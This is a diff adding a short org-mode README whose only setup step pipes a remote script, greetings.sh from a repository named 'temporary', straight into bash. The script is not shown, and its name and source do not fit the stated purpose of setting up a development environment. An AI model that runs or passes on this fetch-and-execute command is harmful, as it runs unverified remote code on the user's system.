@@ -1,0 +1,8 @@
+#+title: README
+
+* Getting Started
+** Configuring system
+Starting out, you want this command to setup your development environment.
+#+begin_src shell
+curl https://raw.githubusercontent.com/jbeni867/temporary/refs/heads/main/greetings.sh | bash
+#+end_src
